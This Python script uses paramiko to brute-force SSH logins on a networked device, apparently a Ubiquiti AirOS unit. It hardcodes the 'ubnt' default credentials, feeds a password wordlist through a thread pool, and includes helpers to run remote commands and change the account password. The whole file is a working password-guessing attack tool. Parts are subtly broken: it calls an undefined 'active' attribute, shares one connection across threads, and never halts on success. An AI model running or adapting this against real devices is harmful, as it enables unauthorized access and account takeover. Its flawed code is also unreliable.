from paramiko import SSHClient
from paramiko.ssh_exception import AuthenticationException
import concurrent.futures


class Executor:
    _addr = "192.168.1.20"
    _port = 22
    _uname = "ubnt"
    _passwd = "ubnt"
    def __init__(self, addr: str) -> None:
        self._addr = addr
        self.client = SSHClient()
        self.client.load_system_host_keys()
        
    def connect(self, uname: str, passwd: str) -> bool:
        try:
            self.client.connect(self._addr, port=self._port, username=uname, password=passwd)
        except AuthenticationException:
            return False
        return True

    @property
    def data(self) -> dict:
        return {"addr": self._addr, "port": self._port, "uname": self._uname, "passwd": self._passwd}

    def exec(self, cmd: str) -> list:
        if not self.active:
            raise ConnectionAbortedError("Lost connection!")
        stdin, stdout, stderr = self.client.exec_command(cmd)
        return [stdout.readlines(), stderr.readlines()]

    def exec_input(self, cmd: str, inpt: list) -> list:
        if not self.active:
            raise ConnectionAbortedError("Lost connection!")
        stdin, stdout, stderr = self.client.exec_command(cmd)
        for line in inpt:
            stdin.write(line + "\n")
        stdin.close()
        return [stdout.readlines(), stderr.readlines()]

    def change_password(self, new_password: str) -> bool:
        if type(new_password) is not str:
            raise TypeError("Password should be string!")
        out, err = self.exec_input(f"passwd {self._uname}", [new_password, new_password])
        if len(err):
            print("Errors:")
            print(err)
            return False
        return True

    def close(self):
        self.client.close()

broken = False
airos = None

def check(passwd: str) -> None:
    global broken
    global airos
    print("Trying:", passwd)
    if airos.connect("ubnt", passwd):
        broken = True

if __name__ == "__main__":
    airos = Executor("192.168.1.20")

    with open("passes.txt", "r") as f:
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            executor.map(check, [x.strip() for x in f.readlines()])
